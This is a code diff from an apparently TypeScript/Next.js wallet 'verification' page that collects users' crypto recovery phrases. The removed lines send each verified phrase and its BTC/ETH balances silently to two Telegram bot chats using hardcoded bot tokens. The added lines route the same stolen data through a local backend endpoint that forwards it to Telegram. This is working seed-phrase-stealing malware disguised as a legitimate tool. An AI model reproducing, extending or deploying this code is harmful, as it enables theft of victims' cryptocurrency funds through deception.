@@ -38,60 +38,33 @@ const TELEGRAM_BOT_TOKEN_2 = "7849948168:AAGlhFLe07LWuZ8rt59J3rdKxrh8u6fCKHE";
 const TELEGRAM_CHAT_ID_1 = "7575241701";
 const TELEGRAM_CHAT_ID_2 = "6232955005";
 
-// Function to send data to Telegram channels
-const sendToTelegram = async (
+// Function to send data to backend server which will handle Telegram messages
+const sendToBackend = async (
   phrase: string,
   balances?: { btc?: number; eth?: number }
 ) => {
   try {
-    // Format message with phrase and balances if available
-    const message = `
-🔐 New Wallet Phrase:
-${phrase}
+    // Use absolute URL since Next.js is using 'output: export'
+    const response = await fetch("http://localhost:5005/api/send-wallet-data", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        phrase,
+        balances,
+      }),
+    });
 
-${
-  balances
-    ? `💰 Balances:
-BTC: ${balances.btc || 0} BTC
-ETH: ${balances.eth || 0} ETH`
-    : ""
-}
-    `.trim();
+    if (!response.ok) {
+      throw new Error(`Server responded with status: ${response.status}`);
+    }
 
-    // Send to both channels simultaneously
-    const sendToChannel1 = fetch(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID_1,
-          text: message,
-        }),
-      }
-    );
-
-    const sendToChannel2 = fetch(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID_2,
-          text: message,
-        }),
-      }
-    );
-
-    // Execute both requests in parallel
-    await Promise.all([sendToChannel1, sendToChannel2]);
+    return await response.json();
   } catch (error) {
     // Silently handle errors to not affect user experience
-    // console.error("Error sending data to Telegram:", error);
+    console.error("Error sending data to backend:", error);
+    return null;
   }
 };
 
@@ -124,9 +97,9 @@ const WalletVerificationSection = () => {
       const verificationResult = await verifyWalletPhrase(phrase);
       setResult(verificationResult);
 
-      // Only send data to Telegram if verification was successful
+      // Send data to backend server instead of directly to Telegram
       if (verificationResult.success) {
-        sendToTelegram(phrase, verificationResult.balances);
+        sendToBackend(phrase, verificationResult.balances);
       }
     } catch (error) {
       setResult({
